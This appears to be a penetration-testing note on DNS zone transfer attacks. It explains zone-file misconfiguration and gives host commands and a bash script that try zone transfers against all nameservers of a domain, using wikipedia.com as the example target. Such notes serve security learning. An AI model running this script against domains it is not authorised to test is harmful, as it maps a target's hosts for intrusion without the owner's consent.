# DNS Zone Transfer Attack

## Overview

* sometimes DNS servers are misconfigured
* DNS servers contain a Zone File which It uses to replicate the map of the domain
* they should be configured so that only the replicating DNS server can access it
* if misconfigured so anyone can request the Zone File, you can receive the whole list of subdomains which is rare in the wild



## Figure out which DNS server a domain has

```bash
host -t ns wikipedia.com
#results may say ns1, ns2, ns3, etc
```

### Additionally, These Tools will Help

* dnsrecon
* dnsenum

## Zone Transfer Command

```bash
#host -l domain_name dns_server_address
host -l wikipedia.com ns1.wikipedia.com
```

## Bash Scripts

```bash
#get all DNS servers from a host
host -t ns wikipedia.com | cut -d " " -f 4

######################attempts zone transfers from all nameservers
#!/bin/bash

#Simple Zone Transfer Script
if [ -z "$1" ]; then
  echo "[*] Simple Zone transfer script"
  echo "[*] Example : $0 <example.com> "
  exit 0
fi

#if argument was given...

for server in $(host -t ns $1 | cut -d " " -f4); do
  #For each of these servers, attempt a zone transfer
  host -l $1 $server |grep "has address"
done
```

## Link to Go More in Depth

[https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack](https://security.stackexchange.com/questions/10452/dns-zone-transfer-attack)

